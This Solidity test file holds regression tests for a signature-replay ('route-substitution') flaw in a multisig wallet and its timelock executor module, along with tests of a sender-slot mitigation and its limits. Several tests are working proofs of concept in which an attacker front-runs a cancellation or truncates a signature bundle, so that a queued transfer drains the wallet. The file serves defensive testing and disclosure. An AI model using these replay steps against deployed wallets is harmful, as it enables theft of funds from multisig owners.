// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "forge-std/Test.sol";
import "../src/Multisig.sol";
import "../src/mods/TimelockExecutor.sol";

/// @dev Regression tests for the route-substitution class, raised independently
/// by the GPT-5.6 Sol review (H-01) and the leftclaw review (M-2), and missed by
/// the two reviews before them.
///
/// `Multisig.execute()` and `TimelockExecutor.forward()` verify the *same*
/// EIP-712 `Execute` digest. Nothing in the signed payload says which route the
/// signers meant, so a bundle collected for one is valid for the other. Sending
/// it down the wrong route queues what should have run now and consumes the
/// nonce, so the intended call then reverts.
///
/// For a cancellation that is fatal rather than merely slow: the proposal being
/// cancelled was queued first, so it matures first, `executeQueued` is
/// permissionless, and `cancelQueued` does not revert on an absent entry — the
/// late cancel deletes nothing and reports success.
///
/// The mitigation these tests pin down needs no contract change: spend one slot
/// of the bundle on a `v=0` sender slot naming the submitter, which the wallet
/// accepts only when `msg.sender` is that owner. See `test_M2_SenderSlot*`.
contract RouteSubstitutionTest is Test {
    MultisigFactory factory;
    TimelockExecutor executor;

    uint256 pk1 = 0xA1;
    uint256 pk2 = 0xB2;
    uint256 pk3 = 0xC3;
    address owner1;
    address owner2;
    address owner3;

    address attacker = address(0xBAD);
    address victim = address(0xDEAD);

    bytes32 constant EXECUTE_TYPEHASH = keccak256("Execute(address target,uint256 value,bytes data,uint32 nonce)");

    uint256 nextSalt;
    uint32 constant DELAY = 2 days;

    function setUp() public {
        owner1 = vm.addr(pk1);
        owner2 = vm.addr(pk2);
        owner3 = vm.addr(pk3);
        factory = new MultisigFactory();
        executor = new TimelockExecutor();
    }

    // ───────── Helpers ─────────

    function _owners() internal view returns (address[] memory arr) {
        arr = new address[](3);
        (arr[0], arr[1], arr[2]) = (owner1, owner2, owner3);
        for (uint256 i; i < 3; ++i) {
            for (uint256 j = i + 1; j < 3; ++j) {
                if (arr[i] > arr[j]) (arr[i], arr[j]) = (arr[j], arr[i]);
            }
        }
    }

    function _sortedPKs(uint256[] memory pks) internal pure returns (uint256[] memory) {
        for (uint256 i; i < pks.length; ++i) {
            for (uint256 j = i + 1; j < pks.length; ++j) {
                if (vm.addr(pks[i]) > vm.addr(pks[j])) (pks[i], pks[j]) = (pks[j], pks[i]);
            }
        }
        return pks;
    }

    function _deploy(uint256 threshold, uint256 funding) internal returns (Multisig w) {
        vm.deal(address(this), funding);
        w = Multisig(
            payable(factory.create{value: funding}(_owners(), DELAY, threshold, address(executor), nextSalt++))
        );
    }

    function _digest(Multisig w, address to, uint256 value, bytes memory data, uint32 nonce)
        internal
        view
        returns (bytes32)
    {
        return keccak256(
            abi.encodePacked(
                "\x19\x01",
                w.DOMAIN_SEPARATOR(),
                keccak256(abi.encode(EXECUTE_TYPEHASH, to, value, keccak256(data), nonce))
            )
        );
    }

    function _sign(Multisig w, address to, uint256 value, bytes memory data, uint256[] memory pks)
        internal
        view
        returns (bytes memory sigs)
    {
        bytes32 hash = _digest(w, to, value, data, w.nonce());
        sigs = new bytes(pks.length * 65);
        for (uint256 i; i < pks.length; ++i) {
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(pks[i], hash);
            uint256 o = i * 65;
            assembly {
                let ptr := add(add(sigs, 0x20), o)
                mstore(ptr, r)
                mstore(add(ptr, 0x20), s)
                mstore8(add(ptr, 0x40), v)
            }
        }
    }

    /// @dev Take the first `n` 65-byte slots — what an attacker does to make an
    /// oversized bundle fit `execute()`'s exact-length check.
    function _truncate(bytes memory sigs, uint256 n) internal pure returns (bytes memory out) {
        out = new bytes(n * 65);
        for (uint256 i; i < n * 65; ++i) {
            out[i] = sigs[i];
        }
    }

    /// @dev Replace slot `idx` with a v=0 sender slot naming `owner`: 32 bytes
    /// of address (right-aligned), 32 unused, then v = 0.
    function _bindSlot(bytes memory sigs, uint256 idx, address owner) internal pure returns (bytes memory out) {
        out = sigs;
        uint256 o = idx * 65;
        bytes32 who = bytes32(uint256(uint160(owner)));
        assembly {
            let ptr := add(add(out, 0x20), o)
            mstore(ptr, who)
            mstore(add(ptr, 0x20), 0)
            mstore8(add(ptr, 0x40), 0)
        }
    }

    function _pks2() internal view returns (uint256[] memory pks) {
        pks = new uint256[](2);
        (pks[0], pks[1]) = (pk1, pk2);
        pks = _sortedPKs(pks);
    }

    function _pks3() internal view returns (uint256[] memory pks) {
        pks = new uint256[](3);
        (pks[0], pks[1], pks[2]) = (pk1, pk2, pk3);
        pks = _sortedPKs(pks);
    }

    // ───────── H-01 / M-2: the attack ─────────

    /// The core finding. Owners sign a cancellation meaning it to land now via
    /// forward(); an observer replays the same bytes into execute(), which
    /// queues it and burns the nonce. The malicious proposal matures first and
    /// anyone can run it. The cancel then deletes nothing, without reverting.
    function test_H01_CancelSuppressedByRouteSubstitution() public {
        Multisig w = _deploy(2, 100 ether);

        // 1. A malicious transfer is queued at nonce 0.
        bytes memory drain = "";
        bytes memory sigsBad = _sign(w, attacker, 50 ether, drain, _pks2());
        w.execute(attacker, 50 ether, drain, sigsBad);
        bytes32 badHash = _digest(w, attacker, 50 ether, drain, 0);
        uint256 badEta = w.queued(badHash);
        assertGt(badEta, 0, "malicious tx should be queued");

        // 2. Owners sign a cancellation, intending forward() -> immediate.
        bytes memory cancelData = abi.encodeCall(Multisig.cancelQueued, (badHash));
        bytes memory cancelSigs = _sign(w, address(w), 0, cancelData, _pks2());

        // 3. Attacker copies those bytes and front-runs down the other route.
        vm.prank(attacker);
        w.execute(address(w), 0, cancelData, cancelSigs);

        // The cancellation is now itself queued, maturing no earlier than the
        // transaction it was meant to stop.
        bytes32 cancelHash = _digest(w, address(w), 0, cancelData, 1);
        uint256 cancelEta = w.queued(cancelHash);
        assertGe(cancelEta, badEta, "cancel matures no earlier than the tx it cancels");
        assertGt(w.queued(badHash), 0, "malicious tx is still queued");

        // 4. The intended forward() now reverts: the nonce moved.
        vm.expectRevert(TimelockExecutor.InvalidSig.selector);
        executor.forward(address(w), address(w), 0, cancelData, cancelSigs);

        // 5. The malicious transfer matures and anyone executes it.
        vm.warp(badEta);
        uint256 before = attacker.balance;
        vm.prank(victim);
        w.executeQueued(attacker, 50 ether, drain, 0);
        assertEq(attacker.balance - before, 50 ether, "attacker drained the wallet on schedule");

        // 6. The cancellation finally matures and is a silent no-op.
        vm.warp(cancelEta);
        w.executeQueued(address(w), 0, cancelData, 1);
        assertEq(w.queued(badHash), 0, "entry already consumed; cancel deleted nothing");
    }

    /// The k-of-n variant: an oversized unanimous bundle is truncated to
    /// threshold size and replayed, queueing an action meant to run now.
    function test_H01_UnanimousBundleTruncatedToQueueTheAction() public {
        Multisig w = _deploy(2, 100 ether);
        vm.prank(address(w));
        w.setExecutor(address(executor));

        bytes memory sigs3 = _sign(w, victim, 1 ether, "", _pks3());
        assertEq(sigs3.length, 3 * 65, "unanimous bundle is ownerCount slots");

        // execute() rejects the full set on length alone, which makes the extra
        // signature look inert.
        vm.expectRevert(Multisig.InvalidSig.selector);
        w.execute(victim, 1 ether, "", sigs3);

        // Truncated to threshold, the same bytes are accepted — and queue.
        bytes memory sigs2 = _truncate(sigs3, 2);
        vm.prank(attacker);
        w.execute(victim, 1 ether, "", sigs2);

        assertGt(w.queued(_digest(w, victim, 1 ether, "", 0)), 0, "action was queued, not executed");
        assertEq(victim.balance, 0, "nothing moved now");
    }

    // ───────── The mitigation ─────────

    /// A cancel bundle is exactly `threshold` slots. Binding one to the
    /// submitter leaves threshold-1 usable signatures — one short of what
    /// execute() demands — so a copier cannot replay it down either route.
    function test_M2_SenderSlotClosesTheCancelPath() public {
        Multisig w = _deploy(2, 100 ether);

        bytes memory sigsBad = _sign(w, attacker, 50 ether, "", _pks2());
        w.execute(attacker, 50 ether, "", sigsBad);
        bytes32 badHash = _digest(w, attacker, 50 ether, "", 0);

        bytes memory cancelData = abi.encodeCall(Multisig.cancelQueued, (badHash));
        uint256[] memory pks = _pks2();
        bytes memory cancelSigs = _sign(w, address(w), 0, cancelData, pks);

        // Bind the slot belonging to whichever owner submits.
        address submitter = vm.addr(pks[0]);
        bytes memory bound = _bindSlot(cancelSigs, 0, submitter);

        // A copier cannot use it on the direct route.
        vm.prank(attacker);
        vm.expectRevert(Multisig.InvalidSig.selector);
        w.execute(address(w), 0, cancelData, bound);

        // Nor through the module.
        vm.prank(attacker);
        vm.expectRevert(TimelockExecutor.InvalidSig.selector);
        executor.forward(address(w), address(w), 0, cancelData, bound);

        // The bound owner submits it and the cancellation lands immediately.
        vm.prank(submitter);
        executor.forward(address(w), address(w), 0, cancelData, bound);
        assertEq(w.queued(badHash), 0, "malicious tx cancelled before its ETA");
    }

    /// Honest scope: on a k-of-n wallet the unanimous bundle carries n slots, so
    /// binding one still leaves n-1 >= k copyable signatures. The binding does
    /// NOT close the fast path — only a route-bound typehash would.
    function test_M2_SenderSlotDoesNotCloseTheUnanimousPath() public {
        Multisig w = _deploy(2, 100 ether);

        bytes memory sigs3 = _sign(w, victim, 1 ether, "", _pks3());
        bytes memory bound = _bindSlot(sigs3, 0, vm.addr(_pks3()[0]));

        // Two unbound ECDSA slots remain, which is exactly threshold.
        bytes memory stolen = new bytes(2 * 65);
        for (uint256 i; i < 2 * 65; ++i) {
            stolen[i] = bound[65 + i];
        }

        vm.prank(attacker);
        w.execute(victim, 1 ether, "", stolen);
        assertGt(w.queued(_digest(w, victim, 1 ether, "", 0)), 0, "fast path still deniable on k-of-n");
    }

    // ───────── Supporting facts the finding rests on ─────────

    /// cancelQueued deletes an absent entry without reverting, which is why a
    /// late cancellation reports success while having done nothing.
    function test_H01_CancelOfAbsentEntryDoesNotRevert() public {
        Multisig w = _deploy(2, 1 ether);
        bytes32 ghost = keccak256("never queued");
        vm.prank(address(w));
        w.cancelQueued(ghost);
        assertEq(w.queued(ghost), 0, "no revert, nothing to delete");
    }

    /// The cancel route needs only `threshold` signatures and does not consult
    /// forwardEnabled — which is why this class reaches every wallet with a
    /// timelock and this executor, not just ones that opted into the fast path.
    function test_H01_CancelRouteNeedsNoForwardEnabled() public {
        Multisig w = _deploy(2, 10 ether);
        assertFalse(executor.forwardEnabled(address(w)), "fast path is off");

        bytes memory sigsBad = _sign(w, attacker, 5 ether, "", _pks2());
        w.execute(attacker, 5 ether, "", sigsBad);
        bytes32 badHash = _digest(w, attacker, 5 ether, "", 0);

        bytes memory cancelData = abi.encodeCall(Multisig.cancelQueued, (badHash));
        uint256[] memory pks = _pks2();
        bytes memory cancelSigs = _sign(w, address(w), 0, cancelData, pks);

        vm.prank(vm.addr(pks[0]));
        executor.forward(address(w), address(w), 0, cancelData, cancelSigs);
        assertEq(w.queued(badHash), 0, "cancel works with the fast path disabled");
    }
}
